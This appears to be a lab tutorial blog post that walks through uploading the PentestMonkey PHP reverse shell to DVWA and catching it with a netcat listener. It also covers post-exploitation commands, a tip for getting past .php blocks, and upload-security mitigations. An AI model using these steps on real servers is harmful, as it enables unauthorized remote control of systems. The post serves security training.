---
title: Getting a Reverse Shell on a Server Through a File Upload
date: 2024-01-11 08:01:35 +0300
subtitle: Product Design
image: '/images/811.png'
---
# Getting a Reverse Shell on a Server Through a File Upload

## **Objective**
Learn how attackers exploit insecure file upload functionalities to execute a reverse shell on a target server, and understand how to secure applications against such vulnerabilities.

---

## **Purpose**
Insecure file upload vulnerabilities allow attackers to upload malicious files, such as scripts, to a web server. By executing these scripts, attackers can gain unauthorized access and control over the server. This lab demonstrates how to exploit this vulnerability and implement mitigation strategies.

---

## **Tools Required**
- **Kali Linux**: For creating and uploading the reverse shell.
- A vulnerable web application (e.g., Damn Vulnerable Web Application - DVWA).
- **Netcat**: For setting up a listener to capture the reverse shell connection.

---

## **Lab Topology**
- **Kali Linux**: Hosting the reverse shell payload and listener.
- **DVWA**: A vulnerable web application running on a local or virtual server.

---

## **Walkthrough**

### **Task 1: Setting Up DVWA**
1. **Install DVWA**:
   - Follow [DVWA installation instructions](https://github.com/digininja/DVWA).
   - Host it on a local server (e.g., XAMPP, WAMP, or Docker).

2. **Access DVWA**:
   - Open a browser and navigate to:
     ```
     http://<dvwa_ip>/dvwa
     ```
     Replace `<dvwa_ip>` with the IP of the system hosting DVWA.

3. **Login to DVWA**:
   - Default credentials:
     ```
     Username: admin
     Password: password
     ```

4. **Set Security Level**:
   - Navigate to **DVWA Security**.
   - Set the security level to **Low**.

---

### **Task 2: Preparing the Reverse Shell Payload**
1. **Generate a PHP Reverse Shell**:
   - Use the **PentestMonkey PHP Reverse Shell**:
     ```bash
     wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
     ```

2. **Edit the Reverse Shell Script**:
   - Open the script in a text editor:
     ```bash
     nano php-reverse-shell.php
     ```
   - Modify the following lines:
     ```php
     $ip = 'YOUR_IP'; // Change this to your Kali Linux IP
     $port = 4444;    // Change this to the port you will use for the listener
     ```
   - Replace `YOUR_IP` with your Kali Linux IP address.

3. **Save the Script**:
   - Save the file as `shell.php`.

---

### **Task 3: Uploading the Reverse Shell**
1. **Navigate to the File Upload Functionality**:
   - In DVWA, click on the **File Upload** module in the navigation menu.

2. **Upload the Malicious File**:
   - Use the file upload form to upload `shell.php`.
   - Note the file path or URL where the uploaded file is stored.

3. **Verify the Upload**:
   - Access the uploaded file in your browser to ensure it was successfully uploaded:
     ```
     http://<dvwa_ip>/dvwa/hackable/uploads/shell.php
     ```

---

### **Task 4: Setting Up the Listener**
1. **Start a Netcat Listener**:
   - Open a terminal on Kali Linux and run:
     ```bash
     nc -lvnp 4444
     ```
   - Ensure the port matches the one set in the reverse shell script.

2. **Trigger the Reverse Shell**:
   - Access the uploaded file in your browser:
     ```
     http://<dvwa_ip>/dvwa/hackable/uploads/shell.php
     ```
   - This triggers the reverse shell, connecting back to your listener.

3. **Verify the Connection**:
   - Check the Netcat listener terminal for an active connection.
   - You should see a shell prompt for the target server.

---

### **Task 5: Post-Exploitation**
1. **Explore the Server**:
   - Use basic Linux commands to explore the server:
     ```bash
     whoami
     pwd
     ls -la
     ```

2. **Escalate Privileges (Optional)**:
   - Search for potential privilege escalation opportunities (e.g., misconfigured sudo permissions).

3. **Document Findings**:
   - Record all actions and observations for reporting.

---

### **Task 6: Mitigating File Upload Vulnerabilities**
1. **Validate File Types**:
   - Restrict file uploads to specific extensions (e.g., `.jpg`, `.png`).
   - Use server-side validation to enforce file type checks.

2. **Rename Uploaded Files**:
   - Rename files to random, non-executable names upon upload.

3. **Store Files Outside Web Root**:
   - Save uploaded files in a directory not directly accessible via the web server.

4. **Set Proper Permissions**:
   - Ensure uploaded files cannot be executed by the server.

5. **Monitor and Log Uploads**:
   - Regularly review logs for suspicious uploads or access attempts.

---

## **Best Practices**
1. **Conduct Regular Security Tests**:
   - Test file upload functionalities for vulnerabilities during development and deployment.

2. **Educate Developers**:
   - Train developers on secure coding practices to prevent file upload issues.

3. **Use Security Tools**:
   - Deploy Web Application Firewalls (WAFs) to block malicious uploads.

4. **Isolate Uploaded Files**:
   - Use containers or sandboxes to process and store uploaded files.

---

## **Key Takeaways**
1. File upload vulnerabilities can lead to complete server compromise.
2. Proper validation, storage, and permissions are critical for securing file upload features.
3. Regular testing and monitoring can prevent exploitation of insecure file uploads.

---

## **Troubleshooting Tips**
1. **File Upload Fails**:
   - Ensure the application allows `.php` file uploads.
   - Test with different file extensions if the application blocks `.php`.

2. **Reverse Shell Does Not Trigger**:
   - Verify the listener is active and configured correctly.
   - Check the reverse shell script for the correct IP and port.

3. **No Connection in Netcat**:
   - Ensure the target server can reach your Kali Linux machine (e.g., no firewalls blocking traffic).
   - Use tools like `tcpdump` to monitor network traffic.

By completing this lab, you now understand how to exploit insecure file uploads to gain a reverse shell and how to secure applications against such attacks.